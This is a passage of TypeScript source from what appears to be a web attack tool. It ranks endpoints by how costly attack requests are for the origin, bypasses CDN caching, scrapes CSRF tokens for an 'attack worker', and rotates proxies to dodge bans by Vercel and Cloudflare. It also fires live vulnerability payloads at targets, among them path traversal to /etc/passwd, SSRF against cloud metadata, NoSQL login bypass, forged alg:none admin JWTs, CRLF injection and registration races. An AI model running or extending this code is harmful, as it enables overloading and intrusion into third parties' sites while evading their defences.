  const isHtml = ct.includes("html");
  const isStatic = ct.includes("css") || ct.includes("javascript") ||
    ct.includes("font") || ct.includes("image/") || ct.includes("woff") ||
    ct.includes("octet-stream") || ct.includes("text/plain");
  const cachedAtEdge = (cacheStatus || "").toLowerCase();
  const isCacheHit = cachedAtEdge.includes("hit") || cachedAtEdge.includes("stale");

  // Cache-aware HOT/WARM decision. JSON endpoints used to be HOT
  // unconditionally — but JSON behind a CDN with cache-status=HIT means
  // every probe (and every attack request) hits edge cache, never the
  // backend. That's WARM at best from an attack-cost perspective.
  // Order matters: cache-hit check goes BEFORE content-type bucketing so
  // a 200 JSON served from cache doesn't get falsely promoted.
  if (isCacheHit) {
    return { classification: "warm", reason: `edge-cached (${cachedAtEdge}) — origin unreachable via this URL` };
  }
  // Cache MISS / DYNAMIC / BYPASS is a strong HOT signal even for short
  // responses — the origin handled this request even if the body is small.
  const isCacheMiss = /miss|dynamic|bypass|expired|revalidated/i.test(cachedAtEdge);
  if (isJson) {
    const ext = isCacheMiss
      ? `JSON · cache=${cachedAtEdge} · ${latencyMs}ms · ${(sizeBytes / 1024).toFixed(1)}KB`
      : `JSON · ${latencyMs}ms · ${(sizeBytes / 1024).toFixed(1)}KB`;
    return { classification: "hot", reason: ext };
  }
  if (isHtml && sizeBytes > 2_000) {
    return { classification: "hot", reason: `dynamic HTML · ${latencyMs}ms · ${(sizeBytes / 1024).toFixed(1)}KB` };
  }
  if (isStatic) return { classification: "warm", reason: `static ${ct.split(";")[0]}` };
  if (isHtml) return { classification: "warm", reason: `small HTML · ${(sizeBytes / 1024).toFixed(1)}KB` };
  // Latency-aware fallback. A 200 with high latency (>150ms) signals the
  // origin took time on this even if content-type is generic — promote.
  if (latencyMs >= 150) {
    return { classification: "hot", reason: `slow 200 · ${latencyMs}ms · ${ct || "no-ct"}` };
  }
  return { classification: "warm", reason: `200 ${ct || "no-ct"}` };
}

async function fetchOne(
  url: string,
  timeoutMs: number,
): Promise<EndpointSample | null> {
  const startedAt = Date.now();
  const r = await probeFetch(url, {
    method: "GET",
    timeoutMs,
    bodyCapBytes: 64_000,
    followRedirects: false,
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
      "Accept": "text/html,application/json,application/xml;q=0.9,*/*;q=0.8",
    },
  });
  if (!r) return null;
  const latencyMs = Date.now() - startedAt;
  const ct = r.headers.get("content-type") || "";
  const cacheStatus = r.headers.get("x-vercel-cache")
    || r.headers.get("cf-cache-status")
    || r.headers.get("x-cache")
    || undefined;
  const loc = r.headers.get("location") || undefined;
  const { classification, reason } = classifyEndpoint(
    r.status, latencyMs, r.bodyBytes, ct, cacheStatus, loc);
  let path = url;
  try { path = new URL(url).pathname + (new URL(url).search || ""); } catch {/* */}
  return {
    url, path,
    status: r.status,
    latencyMs,
    sizeBytes: r.bodyBytes,
    contentType: ct.split(";")[0],
    cacheStatus,
    classification,
    reason,
  };
}

// #59 POST classification rules differ from GET:
//   - 2xx → HOT (server returned data on empty POST = active endpoint)
//   - 400 / 422 → HOT (server validated body and rejected — DB layer was touched)
//   - 401 / 403 → AUTH (POST works but needs auth)
//   - 405 → DEAD (still wrong method)
//   - 404 → DEAD (route doesn't exist)
//   - 5xx → DEAD (or temporarily broken)
function classifyPostEndpoint(
  status: number,
  latencyMs: number,
  sizeBytes: number,
  contentType: string,
): { classification: EndpointSample["classification"]; reason: string } {
  const ct = (contentType || "").toLowerCase().split(";")[0];
  if (status >= 200 && status < 300) {
    return { classification: "hot", reason: `POST 2xx · ${latencyMs}ms · ${(sizeBytes / 1024).toFixed(1)}KB` };
  }
  if (status === 400 || status === 422) {
    return { classification: "hot", reason: `POST ${status} (body validated) · ${latencyMs}ms` };
  }
  if (status === 401 || status === 403) {
    // #63 Same aggressive promotion for POST: server validated body before
    // rejecting → costs CPU → HOT. POST thresholds are lower than GET because
    // POSTs almost always do at least parsing/auth work.
    if (latencyMs >= 80 && sizeBytes >= 100) {
      return {
        classification: "hot",
        reason: `POST ${status} processed-then-denied · ${latencyMs}ms · ${(sizeBytes / 1024).toFixed(1)}KB`,
      };
    }
    return { classification: "auth", reason: `POST ${status} cheap-reject · ${latencyMs}ms` };
  }
  return { classification: "dead", reason: `POST ${status} ${ct || "?"}` };
}

async function postProbeOne(
  url: string,
  timeoutMs: number,
  body: string = "{}",
  contentType: string = "application/json",
): Promise<EndpointSample | null> {
  const startedAt = Date.now();
  const r = await probeFetch(url, {
    method: "POST",
    timeoutMs,
    bodyCapBytes: 32_000,
    followRedirects: false,
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
      "Accept": "application/json,text/html,*/*;q=0.8",
      "Content-Type": contentType,
    },
    body,
  });
  if (!r) return null;
  const latencyMs = Date.now() - startedAt;
  const ct = r.headers.get("content-type") || "";
  const { classification, reason } = classifyPostEndpoint(r.status, latencyMs, r.bodyBytes, ct);
  let path = url;
  try { path = new URL(url).pathname + (new URL(url).search || ""); } catch {/* */}
  return {
    url, path,
    status: r.status,
    latencyMs,
    sizeBytes: r.bodyBytes,
    contentType: ct.split(";")[0],
    classification,
    reason,
    method: "POST",
  };
}

// L8 — CSRF token scraper. Walks the main HTML body for the patterns the
// major frameworks use. Returns the first plausible token + the name we
// found it under (so the attack worker can echo it back in the same field).
//
// We deliberately scan a curated name list rather than "any hidden input"
// because every form on a page has hidden inputs (search filters, page
// numbers, etc.) and picking the wrong one corrupts our POST payloads.
function extractCsrfToken(html: string): { token: string; name: string } | null {
  if (!html || html.length < 50) return null;
  const KNOWN_NAMES = [
    // Highest-confidence first: explicit "csrf" strings
    "csrf-token", "csrf_token", "csrf",
    "_csrf", "_csrf_token", "_token",
    // Framework specifics
    "csrfmiddlewaretoken",                    // Django
    "authenticity_token",                     // Rails
    "__RequestVerificationToken",             // ASP.NET MVC + Razor
    "anti-csrf-token", "x-csrf-token",
    "xsrf-token", "x-xsrf-token",
    // Spring puts it as a meta or in a hidden input
    "_csrf",
  ];

  // 1. Meta-tag form: <meta name="csrf-token" content="...">
  //    Rails / Laravel / Spring all use this; Vue/React SPAs that consume
  //    Rails APIs read from `<meta name="csrf-token">` in the SSR shell.
  for (const name of KNOWN_NAMES) {
    const reMeta = new RegExp(
      `<meta[^>]+name=["']${name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}["'][^>]+content=["']([^"']{8,256})["']`,
      "i",
    );
    const m = html.match(reMeta);
    if (m && m[1] && m[1].trim().length >= 8) {
      return { token: m[1].trim(), name };
    }
  }

  // 2. Hidden-input form: <input type="hidden" name="csrf_token" value="...">
  //    Attribute order can vary so we try both name-first and value-first.
  for (const name of KNOWN_NAMES) {
    const safeName = name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
    // name then value
    const re1 = new RegExp(
      `<input[^>]+name=["']${safeName}["'][^>]+value=["']([^"']{8,512})["']`,
      "i",
    );
    const m1 = html.match(re1);
    if (m1 && m1[1] && m1[1].trim().length >= 8) {
      return { token: m1[1].trim(), name };
    }
    // value then name
    const re2 = new RegExp(
      `<input[^>]+value=["']([^"']{8,512})["'][^>]+name=["']${safeName}["']`,
      "i",
    );
    const m2 = html.match(re2);
    if (m2 && m2[1] && m2[1].trim().length >= 8) {
      return { token: m2[1].trim(), name };
    }
  }

  // 3. JS variable assignment (some SPAs ship CSRF as a global var in a
  //    server-rendered <script>):  window.csrfToken = "..."; or
  //    var CSRF = "..."; — only match if the variable name is one we know.
  const reJs = /(?:window\.(csrfToken|csrf_token|CSRF|csrf)|var\s+(csrf[_\w]*))\s*=\s*["']([^"']{8,256})["']/i;
  const mJs = html.match(reJs);
  if (mJs && mJs[3]) {
    const vname = (mJs[1] || mJs[2] || "csrf").toLowerCase();
    return { token: mJs[3], name: vname };
  }

  return null;
}

// L8 — HTTP/3 (QUIC) advertisement parser. The Alt-Svc header (RFC 7838)
// is how origins say "I also speak HTTP/3 on UDP port N". Modern Vercel,
// Cloudflare, and most large CDNs advertise this — but their HTTP/3 WAF
// pipelines are sometimes less mature than the h2 ones. We surface the
// existence here so the operator knows there's a parallel attack surface.
function parseAltSvcForH3(altSvc: string | null): { advertised: boolean; altSvc?: string; port?: number } {
  if (!altSvc) return { advertised: false };
  const lower = altSvc.toLowerCase();
  // Match h3 / h3-29 / h3-Q050 / quic etc. Most common: `h3=":443"`.
  if (!/(\bh3\b|\bquic\b)/i.test(lower)) {
    return { advertised: false };
  }
  // Try to extract the port. Patterns: `h3=":443"`, `h3="example.com:443"`.
  const portM = altSvc.match(/h3[^=]*=\s*"[^":]*:(\d{1,5})/i);
  const port = portM ? parseInt(portM[1], 10) : undefined;
  return { advertised: true, altSvc, port };
}

function extractSameOriginLinks(html: string, sameHost: string, origin: string): string[] {
  const out = new Set<string>();
  // href="..." | href='...' | action=... | src=... — same regex covers them.
  const re = /(?:href|action|src)\s*=\s*["']([^"'\s>]+)["']/gi;
  let m: RegExpExecArray | null;
  while ((m = re.exec(html)) !== null) {
    const raw = m[1];
    if (!raw || raw.startsWith("#") || raw.startsWith("mailto:") || raw.startsWith("javascript:")) continue;
    let abs: string;
    try {
      abs = raw.startsWith("http") ? raw : new URL(raw, origin).toString();
      const u = new URL(abs);
      if (u.hostname.toLowerCase() !== sameHost) continue;
      // Drop fragments — they don't change the request.
      u.hash = "";
      out.add(u.toString());
    } catch { continue; }
    if (out.size > 40) break;
  }
  return Array.from(out);
}

function extractNextJsApiRoutes(html: string, origin: string): string[] {
  const out = new Set<string>();
  // The __NEXT_DATA__ script holds initial props + dehydrated state. Even
  // without full JSON parsing, a regex over the raw text finds API routes
  // that the app references — these are usually the spiciest endpoints.
  const m = html.match(/<script[^>]+id=["']__NEXT_DATA__["'][^>]*>([\s\S]*?)<\/script>/i);
  if (!m) return [];
  const blob = m[1];
  const routeRe = /["'](\/(?:api|_next\/data|trpc)\/[A-Za-z0-9_\-./]+)["']/g;
  let r: RegExpExecArray | null;
  while ((r = routeRe.exec(blob)) !== null) {
    try {
      const abs = new URL(r[1], origin).toString();
      out.add(abs);
    } catch {/* */}
    if (out.size > 30) break;
  }
  return Array.from(out);
}

// ─── L5.1 / #65 — Proxy-routed probe ────────────────────────────
//
// Direct sweep from Node's IP gets us banned by Vercel/CF after ~100 probes.
// We rotate every sweep request through a small pool of usable proxies, so
// Vercel sees "1 request from each of 20 IPs" instead of "200 requests from
// our Node IP". The pool is refreshed from proxyManager every 30s so dead
// proxies churn out naturally.
//
// On proxy failure we fall back to direct fetch — the probe still has to
// answer even if our pool is empty/broken. The brain surfaces this in logs.
import { HttpsProxyAgent } from "https-proxy-agent";
import { SocksProxyAgent } from "socks-proxy-agent";

let probeProxyPool: { host: string; port: number; protocol: string; username?: string; password?: string }[] = [];
let probeProxyPoolStaleAt = 0;
const PROBE_POOL_TTL_MS = 30_000;
const PROBE_POOL_SIZE = 20;

function getProbeProxy(): typeof probeProxyPool[number] | null {
  const now = Date.now();
  if (probeProxyPool.length === 0 || probeProxyPoolStaleAt < now) {
    try {
      const usable = proxyManager.usable();
      probeProxyPool = usable.slice(0, PROBE_POOL_SIZE);
      probeProxyPoolStaleAt = now + PROBE_POOL_TTL_MS;
    } catch {
      // proxyManager not ready yet — caller falls back to direct fetch.
      probeProxyPool = [];
    }
  }
  if (probeProxyPool.length === 0) return null;
  return probeProxyPool[Math.floor(Math.random() * probeProxyPool.length)];
}

interface ProbeFetchOpts {
  method: "GET" | "POST" | "HEAD" | "OPTIONS" | "PUT" | "PATCH" | "DELETE";
  headers?: Record<string, string>;
  body?: string;
  timeoutMs: number;
  bodyCapBytes?: number;
  followRedirects?: boolean;
}

interface ProbeFetchResult {
  status: number;
  bodyText: string;
  bodyBytes: number;
  headers: Map<string, string>;
  viaProxy: boolean;
}

async function probeFetch(url: string, opts: ProbeFetchOpts): Promise<ProbeFetchResult | null> {
  const bodyCap = opts.bodyCapBytes ?? 256_000;
  // First try: via a random proxy from the pool.
  const proxy = getProbeProxy();
  if (proxy) {
    try {
      const isSocks = (proxy.protocol || "").toLowerCase().startsWith("socks");
      const auth = proxy.username
        ? `${encodeURIComponent(proxy.username)}:${encodeURIComponent(proxy.password ?? "")}@`
        : "";
      // For HTTP proxies we always use https-proxy-agent regardless of target
      // scheme — it handles both http:// and https:// upstreams via CONNECT.
      const proxyUrl = `${isSocks ? "socks5" : "http"}://${auth}${proxy.host}:${proxy.port}`;
      const agent = isSocks
        ? new SocksProxyAgent(proxyUrl)
        : new HttpsProxyAgent(proxyUrl);
      const axios = (await import("axios")).default;
      const r = await axios({
        url,
        method: opts.method,
        headers: opts.headers ?? {},
        data: opts.body,
        timeout: opts.timeoutMs,
        maxRedirects: opts.followRedirects ? 5 : 0,
        validateStatus: () => true,
        responseType: "text",
        httpsAgent: agent,
        httpAgent: agent,
        maxContentLength: bodyCap,
        decompress: true,
      });
      const bodyText = typeof r.data === "string"
        ? r.data
        : (r.data ? JSON.stringify(r.data) : "");
      const headers = new Map<string, string>();
      for (const [k, v] of Object.entries(r.headers ?? {})) {
        if (v == null) continue;
        headers.set(k.toLowerCase(), Array.isArray(v) ? v[0] : String(v));
      }
      return {
        status: r.status,
        bodyText: bodyText.slice(0, bodyCap),
        bodyBytes: Math.min(bodyText.length, bodyCap),
        headers,
        viaProxy: true,
      };
    } catch {
      // Proxy failed — fall through to direct fetch below.
    }
  }
  // Direct fetch fallback. Same shape so callers don't care which path won.
  try {
    const c = new AbortController();
    const t = setTimeout(() => c.abort(), opts.timeoutMs);
    const r = await fetch(url, {
      method: opts.method,
      signal: c.signal,
      headers: opts.headers ?? {},
      body: opts.body,
      redirect: opts.followRedirects ? "follow" : "manual",
    });
    clearTimeout(t);
    let bodyText = "";
    try {
      const txt = await r.text();
      bodyText = txt.slice(0, bodyCap);
    } catch {/* */}
    const headers = new Map<string, string>();
    r.headers.forEach((v, k) => { headers.set(k.toLowerCase(), v); });
    return {
      status: r.status,
      bodyText,
      bodyBytes: bodyText.length,
      headers,
      viaProxy: false,
    };
  } catch {
    return null;
  }
}

// L6.3 / #70 — Vulnerability probe suite. Each function returns either a
// VulnFinding (positive hit) or null. Findings are surfaced both as HOT
// EndpointSample entries (so they end up in rotation) and as a separate
// `vulnerabilities` array on the probe response (so the UI can show them
// loudly). Probes are PASSIVE — we don't write data anywhere, just check
// if behaviour suggests a class of weakness. False positives are fine;
// they all eventually translate to "go look at /api/X by hand".

interface VulnFinding {
  kind: "path-traversal" | "open-redirect" | "ssrf" | "param-pollution"
      | "nosql-injection" | "jwt-none" | "crlf-injection" | "race-condition"
      | "verbose-error";
  url: string;
  evidence: string;
  severity: "low" | "medium" | "high" | "critical";
}

// Path-traversal probe — try `?path=../../etc/passwd` (Unix) and
// `?path=..\\..\\..\\windows\\win.ini` (Windows). A 200 with body containing
// "root:x:" or "[fonts]" is a critical find.
async function pathTraversalProbe(s: EndpointSample): Promise<VulnFinding | null> {
  if (!s.url.includes("?") && !/(file|path|page|name|doc|template|include|read)/i.test(s.path)) {
    // Likely not file-serving endpoint — skip to limit blast.
    return null;
  }
  const payloads = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc//passwd",
    "..\\..\\..\\..\\windows\\win.ini",
  ];
  // Pick the most likely param: file, path, page, doc, name. If URL has
  // existing query, pivot one param.
  let candidateParams = ["file", "path", "page", "doc", "name", "include", "template"];
  try {
    const u = new URL(s.url);
    for (const k of u.searchParams.keys()) {
      if (/(file|path|page|name|doc|template|include|read|src)/i.test(k)) {
        candidateParams = [k, ...candidateParams];
      }
    }
  } catch {/* */}
  for (const param of candidateParams.slice(0, 3)) {
    for (const payload of payloads.slice(0, 2)) {
      const probeUrl = (() => {
        try {
          const u = new URL(s.url);
          u.searchParams.set(param, payload);
          return u.toString();
        } catch { return null; }
      })();
      if (!probeUrl) continue;
      const r = await probeFetch(probeUrl, {
        method: "GET",
        timeoutMs: 3_500,
        bodyCapBytes: 16_000,
        followRedirects: false,
        headers: { "User-Agent": "Mozilla/5.0 ..." },
      });
      if (!r) continue;
      if (r.status >= 200 && r.status < 300) {
        if (/root:x:0:|\[fonts\]|\[mail\]|\[extensions\]/i.test(r.bodyText)) {
          return {
            kind: "path-traversal",
            url: probeUrl,
            evidence: `param=${param} returned 200 with /etc/passwd or win.ini fingerprint`,
            severity: "critical",
          };
        }
      }
    }
  }
  return null;
}

// Open-redirect probe — apps with `?next=`, `?redirect=`, `?return=`, etc.
// Send a value pointing at an external domain. If the response is 30x with
// Location pointing AT our payload domain, it's an open redirect (phishing
// vector + sometimes SSRF combined).
async function openRedirectProbe(s: EndpointSample): Promise<VulnFinding | null> {
  const redirectKeys = ["next", "redirect", "return", "url", "callback", "to", "goto", "dest", "destination", "redirectTo", "callbackUrl", "return_url", "returnUrl"];
  let url: URL;
  try { url = new URL(s.url); } catch { return null; }
  const haveAnyKey = redirectKeys.some((k) =>
    url.searchParams.has(k) || /\b(next|redirect|return|callback|url|dest)\b/i.test(s.path));
  if (!haveAnyKey && s.path !== "/login" && s.path !== "/signin" && s.path !== "/oauth/authorize") return null;

  const evilHosts = ["evil-probe.example.com", "//evil-probe.example.com", "https://evil-probe.example.com/", "%2F%2Fevil-probe.example.com%2F"];
  // Try each candidate key with each evil value (limit blast).
  for (const key of redirectKeys.slice(0, 5)) {
    for (const evil of evilHosts.slice(0, 2)) {
      const u2 = new URL(s.url);
      u2.searchParams.set(key, evil);
      const r = await probeFetch(u2.toString(), {
        method: "GET",
        timeoutMs: 3_500,
        bodyCapBytes: 4_000,
        followRedirects: false,
        headers: { "User-Agent": "Mozilla/5.0 ..." },
      });
      if (!r) continue;
      if (r.status >= 300 && r.status < 400) {
        const loc = r.headers.get("location") || "";
        if (loc.toLowerCase().includes("evil-probe")) {
          return {
            kind: "open-redirect",
            url: u2.toString(),
            evidence: `${key}=${evil} → ${r.status} Location: ${loc}`,
            severity: "medium",
          };
        }
      }
    }
  }
  return null;
}

// SSRF probe — POST endpoints that accept a URL field. Try the AWS metadata
// service (a critical SSRF target) AND localhost ports. We don't actually
// dump response data; just check if origin connected at all (200/500/timeout
// is signal).
async function ssrfProbe(s: EndpointSample): Promise<VulnFinding | null> {
  if (s.method !== "POST") return null;
  if (!/url|src|target|hook|webhook|callback|import|fetch|proxy/i.test(s.path)) return null;
  const ssrfBodies = [
    JSON.stringify({ url: "http://169.254.169.254/latest/meta-data/" }),  // AWS IMDSv1
    JSON.stringify({ url: "http://localhost:6379/" }),                      // Redis
    JSON.stringify({ url: "http://127.0.0.1:5432/" }),                      // Postgres
    JSON.stringify({ src: "http://169.254.169.254/" }),
  ];
  for (const body of ssrfBodies.slice(0, 2)) {
    const r = await probeFetch(s.url, {
      method: "POST",
      timeoutMs: 4_500,
      bodyCapBytes: 4_000,
      followRedirects: false,
      headers: { "User-Agent": "Mozilla/5.0 ...", "Content-Type": "application/json" },
      body,
    });
    if (!r) continue;
    // Signature 1: response body contains "ami-id", "instance-id" (AWS meta).
    if (/ami-id|instance-id|security-credentials|iam\//i.test(r.bodyText)) {
      return {
        kind: "ssrf",
        url: s.url,
        evidence: `POST body=${body} returned AWS metadata fingerprint (${r.bodyBytes} B)`,
        severity: "critical",
      };
    }
    // Signature 2: latency spike vs baseline = server was waiting on the URL.
    if (r.status >= 200 && r.status < 600 && (Date.now() - 0) && r.bodyBytes > 100) {
      // Without baseline comparison we can't be sure — skip the noisy positive.
    }
  }
  return null;
}

// Parameter pollution — duplicate one param with a different value. If the
// status / body differs from the single-param version, the backend's parser
// disagrees with the framework's, which is the classic HPP vuln signature.
async function paramPollutionProbe(s: EndpointSample): Promise<VulnFinding | null> {
  let url: URL;
  try { url = new URL(s.url); } catch { return null; }
  const keys = Array.from(url.searchParams.keys());
  if (keys.length === 0) return null;
  const key = keys[0];
  const orig = url.searchParams.get(key) ?? "1";
  const single = url.toString();
  const polluted = single + "&" + encodeURIComponent(key) + "=" + encodeURIComponent(orig + "_x");
  const rSingle = await probeFetch(single, {
    method: "GET", timeoutMs: 3_500, bodyCapBytes: 8_000,
    followRedirects: false, headers: { "User-Agent": "Mozilla/5.0 ..." },
  });
  const rPolluted = await probeFetch(polluted, {
    method: "GET", timeoutMs: 3_500, bodyCapBytes: 8_000,
    followRedirects: false, headers: { "User-Agent": "Mozilla/5.0 ..." },
  });
  if (!rSingle || !rPolluted) return null;
  if (rSingle.status !== rPolluted.status ||
      Math.abs(rSingle.bodyBytes - rPolluted.bodyBytes) > Math.max(200, rSingle.bodyBytes * 0.3)) {
    return {
      kind: "param-pollution",
      url: polluted,
      evidence: `dup ${key}: single=${rSingle.status} (${rSingle.bodyBytes}B) vs polluted=${rPolluted.status} (${rPolluted.bodyBytes}B)`,
      severity: "low",
    };
  }
  return null;
}

// NoSQL injection probe — for POST login-style endpoints, send Mongo `$ne`
// operator instead of string value. If status flips from 401/422 to 200
// (or to a non-trivial latency change suggesting different code path),
// origin is processing the operator → vulnerable.
async function nosqlProbe(s: EndpointSample): Promise<VulnFinding | null> {
  if (s.method !== "POST") return null;
  if (!/login|signin|auth|session|user|account/i.test(s.path)) return null;
  const benignBody = JSON.stringify({ email: "probe@example.com", password: "wrong" });
  const nosqlBody = JSON.stringify({ email: { $ne: "" }, password: { $ne: "" } });
  const headers = { "User-Agent": "Mozilla/5.0 ...", "Content-Type": "application/json" };
  const rBenign = await probeFetch(s.url, {
    method: "POST", timeoutMs: 4_000, bodyCapBytes: 8_000, followRedirects: false,
    headers, body: benignBody,
  });
  const rNoSQL = await probeFetch(s.url, {
    method: "POST", timeoutMs: 4_000, bodyCapBytes: 8_000, followRedirects: false,
    headers, body: nosqlBody,
  });
  if (!rBenign || !rNoSQL) return null;
  // Strong signal: NoSQL body returned 200 OR Set-Cookie when the benign body
  // got 401/422.
  const benignDenied = rBenign.status === 401 || rBenign.status === 403 || rBenign.status === 422;
  const nosqlAccepted = rNoSQL.status >= 200 && rNoSQL.status < 300;
  if (benignDenied && nosqlAccepted) {
    return {
      kind: "nosql-injection",
      url: s.url,
      evidence: `{"$ne":""} accepted (${rNoSQL.status}) where benign creds denied (${rBenign.status})`,
      severity: "critical",
    };
  }
  // Weak signal: nosqlBody returned different status/size than benignBody.
  if (rNoSQL.status !== rBenign.status &&
      Math.abs(rNoSQL.bodyBytes - rBenign.bodyBytes) > 200) {
    return {
      kind: "nosql-injection",
      url: s.url,
      evidence: `operator changes response: benign=${rBenign.status} (${rBenign.bodyBytes}B) vs $ne=${rNoSQL.status} (${rNoSQL.bodyBytes}B)`,
      severity: "medium",
    };
  }
  return null;
}

// JWT none-algorithm probe — attach an alg:none JWT and see if the server
// accepts it. Naive auth implementations only check signature presence, not
// algorithm. If the protected endpoint returns 200 with this JWT, the auth
// is fully bypassable.
async function jwtNoneProbe(s: EndpointSample): Promise<VulnFinding | null> {
  if (s.classification !== "auth") return null;
  // Header: {"alg":"none","typ":"JWT"}; payload: {"sub":"admin","role":"admin","iat":<recent>}
  const header = Buffer.from('{"alg":"none","typ":"JWT"}').toString("base64url");
  const payload = Buffer.from(JSON.stringify({
    sub: "admin", role: "admin", iat: Math.floor(Date.now() / 1000),
  })).toString("base64url");
  const jwt = `${header}.${payload}.`;
  const r = await probeFetch(s.url, {
    method: s.method === "POST" ? "POST" : "GET",
    timeoutMs: 3_500,
    bodyCapBytes: 8_000,
    followRedirects: false,
    headers: {
      "User-Agent": "Mozilla/5.0 ...",
      "Accept": "*/*",
      "Authorization": `Bearer ${jwt}`,
      ...(s.method === "POST" ? { "Content-Type": "application/json" } : {}),
    },
    body: s.method === "POST" ? "{}" : undefined,
  });
  if (!r) return null;
  if (r.status >= 200 && r.status < 300) {
    return {
      kind: "jwt-none",
      url: s.url,
      evidence: `alg:none JWT accepted (status ${r.status}, ${r.bodyBytes}B)`,
      severity: "critical",
    };
  }
  return null;
}

// CRLF injection probe — inject \r\nSet-Cookie: in a query param value. If
// the response carries that cookie back to us, the server reflected unsanitized
// input into a response header → header injection / response splitting.
async function crlfProbe(s: EndpointSample): Promise<VulnFinding | null> {
  let url: URL;
  try { url = new URL(s.url); } catch { return null; }
  const keys = Array.from(url.searchParams.keys());
  if (keys.length === 0) return null;
  const key = keys[0];
  const payload = "probe%0d%0aX-CRLF-Probe:%20found";
  // Build URL with raw CRLF — URL ctor would encode \r\n so we string-concat.
  const probeUrl = s.url + (s.url.includes("?") ? "&" : "?") + encodeURIComponent(key) + "=" + payload;
  const r = await probeFetch(probeUrl, {
    method: "GET", timeoutMs: 3_500, bodyCapBytes: 2_000,
    followRedirects: false, headers: { "User-Agent": "Mozilla/5.0 ..." },
  });
  if (!r) return null;
  if (r.headers.get("x-crlf-probe")) {
    return {
      kind: "crlf-injection",
      url: probeUrl,
      evidence: `injected header X-CRLF-Probe reflected back`,
      severity: "high",
    };
  }
  return null;
}

// Race-condition probe — fire 10 simultaneous POST requests to a /register
// or /signup endpoint with the same email. Apps without proper unique
// constraints will succeed >1 time, creating dupes.
async function raceConditionProbe(s: EndpointSample): Promise<VulnFinding | null> {
  if (s.method !== "POST") return null;
  if (!/register|signup|create.*user/i.test(s.path)) return null;
  const sameEmail = `race-probe-${Date.now()}@example.com`;
  const body = JSON.stringify({
    email: sameEmail,
    password: "RaceProbe123!",
    name: "Race Probe",
  });
  const tasks: Promise<ProbeFetchResult | null>[] = [];
  for (let i = 0; i < 10; i++) {
    tasks.push(probeFetch(s.url, {
      method: "POST", timeoutMs: 5_000, bodyCapBytes: 2_000,
      followRedirects: false,
      headers: { "User-Agent": "Mozilla/5.0 ...", "Content-Type": "application/json" },
      body,
    }));
  }
  const results = await Promise.all(tasks);
  const successes = results.filter((r) => r && r.status >= 200 && r.status < 300).length;
  if (successes >= 2) {
    return {
      kind: "race-condition",
      url: s.url,
      evidence: `${successes}/10 parallel registrations succeeded with same email — missing unique constraint`,
      severity: "high",
    };
  }
  return null;
}

// Verbose error probe — many apps leak stack traces on malformed input.
// Send broken JSON to a POST endpoint and inspect response for Java/PHP/
// Node stack-trace fingerprints. Reveals framework + code paths.
async function verboseErrorProbe(s: EndpointSample): Promise<VulnFinding | null> {
  if (s.method !== "POST") return null;
  const r = await probeFetch(s.url, {
    method: "POST", timeoutMs: 3_500, bodyCapBytes: 16_000,
    followRedirects: false,
    headers: { "User-Agent": "Mozilla/5.0 ...", "Content-Type": "application/json" },
    body: "{not_json:::",
  });
  if (!r) return null;
  if (r.status >= 500 && /Stack trace|stacktrace|at [A-Za-z]+\.|Caused by:|nodejs internal|TypeError:|line \d+|Traceback|\bat .*\.js:\d+/i.test(r.bodyText)) {
    const sample = r.bodyText.slice(0, 200).replace(/\s+/g, " ");
    return {
      kind: "verbose-error",
      url: s.url,
      evidence: `500 with stack trace: "${sample}…"`,
      severity: "medium",
    };
  }
  return null;
}

async function runVulnProbes(merged: EndpointSample[]): Promise<VulnFinding[]> {
  const findings: VulnFinding[] = [];
  const hotsAndAuth = merged.filter((s) =>
    s.classification === "hot" || s.classification === "auth"
  );
  // Limit each probe to top candidates so we don't burst the origin.
  const traversalTargets = hotsAndAuth.filter((s) => s.url.includes("?") || /(file|path|doc|read|src)/i.test(s.path)).slice(0, 3);
  const redirectTargets = hotsAndAuth.filter((s) => /next|redirect|return|callback|signin|login|oauth/i.test(s.url + " " + s.path)).slice(0, 3);
  const ssrfTargets = hotsAndAuth.filter((s) => s.method === "POST" && /url|src|hook|callback|import|webhook|proxy/i.test(s.path)).slice(0, 2);
  const ppTargets = hotsAndAuth.filter((s) => s.url.includes("?")).slice(0, 2);
  const nosqlTargets = hotsAndAuth.filter((s) => s.method === "POST" && /login|signin|auth|session/i.test(s.path)).slice(0, 2);
  const jwtTargets = hotsAndAuth.filter((s) => s.classification === "auth").slice(0, 2);
  const crlfTargets = hotsAndAuth.filter((s) => s.url.includes("?")).slice(0, 2);
  const raceTargets = hotsAndAuth.filter((s) => s.method === "POST" && /register|signup/i.test(s.path)).slice(0, 1);
  const verboseTargets = hotsAndAuth.filter((s) => s.method === "POST").slice(0, 2);

  const allProbes: Promise<VulnFinding | null>[] = [
    ...traversalTargets.map((s) => pathTraversalProbe(s)),
    ...redirectTargets.map((s) => openRedirectProbe(s)),
    ...ssrfTargets.map((s) => ssrfProbe(s)),
    ...ppTargets.map((s) => paramPollutionProbe(s)),
    ...nosqlTargets.map((s) => nosqlProbe(s)),
    ...jwtTargets.map((s) => jwtNoneProbe(s)),
    ...crlfTargets.map((s) => crlfProbe(s)),
    ...raceTargets.map((s) => raceConditionProbe(s)),
    ...verboseTargets.map((s) => verboseErrorProbe(s)),
  ];
  const all = await Promise.all(allProbes.map((p) => p.catch(() => null)));
  for (const f of all) if (f) findings.push(f);
  return findings;
}

// L6.2 / #69 — HTTP method matrix. Many middlewares only enforce auth on
// GET/POST and forget PUT/PATCH/DELETE; some have OPTIONS preflight that
// reveals the full Allow: header. We probe these 5 alternative methods on
// the top candidates from the basic GET sweep and surface any whose status
// differs from the GET baseline as a HOT-METHOD vector.
async function methodMatrixOne(
  url: string,
  method: "PUT" | "PATCH" | "DELETE" | "HEAD" | "OPTIONS",
  baselineStatus: number,
): Promise<EndpointSample | null> {
  const startedAt = Date.now();
  const r = await probeFetch(url, {
    method,
    timeoutMs: 2_000,
    bodyCapBytes: 8_000,
    followRedirects: false,
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
      "Accept": "*/*",
      ...(method === "PUT" || method === "PATCH" ? { "Content-Type": "application/json" } : {}),
